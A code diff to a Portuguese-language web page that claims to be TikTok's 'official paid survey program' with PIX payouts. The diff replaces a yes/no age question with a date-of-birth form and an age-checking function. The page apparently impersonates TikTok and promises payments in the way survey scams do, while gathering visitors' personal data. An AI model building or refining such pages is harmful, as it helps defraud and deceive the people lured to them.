@@ -59,7 +59,7 @@
   <!-- Container Principal -->
   <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center space-y-6">
 
-    <!-- ETAPA 1: Verificação de Idade & Banner de Geolocalização -->
+    <!-- ETAPA 1: Verificação de Idade por Data de Nascimento -->
     <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
@@ -76,18 +76,31 @@
       </div>
       <div class="space-y-2">
         <h1 class="text-2xl font-bold tracking-tight text-slate-900">Verificação de Idade</h1>
-        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok na sua região, confirme sua idade.</p>
+        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok na sua região, informe sua data de nascimento.</p>
       </div>
-      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-1">
-        <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Você possui mais de 18 anos?</span>
-        <p class="text-xs text-slate-400">Exigido para autorização de transferência via PIX.</p>
+      
+      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-3">
+        <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block text-center">Informe sua data de nascimento:</span>
+        <div class="grid grid-cols-3 gap-2">
+          <div>
+            <label class="text-[10px] text-slate-400 font-bold block mb-1">DIA</label>
+            <input type="text" id="birth-day" placeholder="DD" maxlength="2" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+          </div>
+          <div>
+            <label class="text-[10px] text-slate-400 font-bold block mb-1">MÊS</label>
+            <input type="text" id="birth-month" placeholder="MM" maxlength="2" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+          </div>
+          <div>
+            <label class="text-[10px] text-slate-400 font-bold block mb-1">ANO</label>
+            <input type="text" id="birth-year" placeholder="AAAA" maxlength="4" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+          </div>
+        </div>
+        <p class="text-[11px] text-slate-400 text-center">Exigido para autorização de transferência via PIX.</p>
       </div>
+
       <div class="space-y-3">
-        <button onclick="answerAge(true)" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
-          Sim, tenho mais de 18 anos
-        </button>
-        <button onclick="answerAge(false)" class="w-full bg-slate-100 hover:bg-slate-200 active:scale-[0.98] transition-all text-slate-600 font-medium py-3 px-4 rounded-xl cursor-pointer text-sm">
-          Não tenho 18 anos
+        <button onclick="verifyBirthDate()" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
+          Confirmar Idade
         </button>
       </div>
     </div>
@@ -783,11 +796,37 @@
       }
     }
 
-    function answerAge(isAdult) {
-      if (!isAdult) {
-        alert("É necessário ter mais de 18 anos para participar.");
+    // --- VERIFICAÇÃO DE IDADE POR DATA DE NASCIMENTO ---
+    function verifyBirthDate() {
+      const day = parseInt(document.getElementById('birth-day').value);
+      const month = parseInt(document.getElementById('birth-month').value);
+      const year = parseInt(document.getElementById('birth-year').value);
+
+      if (!day || !month || !year || isNaN(day) || isNaN(month) || isNaN(year)) {
+        alert("Por favor, preencha a data de nascimento corretamente.");
         return;
       }
+
+      if (day < 1 || day > 31 || month < 1 || month > 12 || year < 1900 || year > new Date().getFullYear()) {
+        alert("Data de nascimento inválida.");
+        return;
+      }
+
+      const today = new Date();
+      const birthDate = new Date(year, month - 1, day);
+      
+      let age = today.getFullYear() - birthDate.getFullYear();
+      const m = today.getMonth() - birthDate.getMonth();
+      
+      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
+        age--;
+      }
+
+      if (age < 18) {
+        alert("Você precisa ter mais de 18 anos para participar.");
+        return;
+      }
+
       switchStep(2);
     }
 
